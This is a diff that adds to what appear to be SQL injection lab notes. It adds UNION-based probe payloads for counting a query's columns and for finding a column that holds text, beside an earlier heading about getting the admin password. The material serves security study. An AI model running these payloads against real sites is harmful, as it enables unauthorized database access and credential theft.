@@ -160,3 +160,16 @@ Get Admins password:
 
 ### SQL injection UNION attack, determining the number of columns returned by the query
 
+We've gone over this already many times
+
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+```
+
+### SQL injection UNION attack, finding a column containing text
+
+```
+' UNION SELECT 'abc',NULL--
+' UNION SELECT NULL,'abc'--
+```
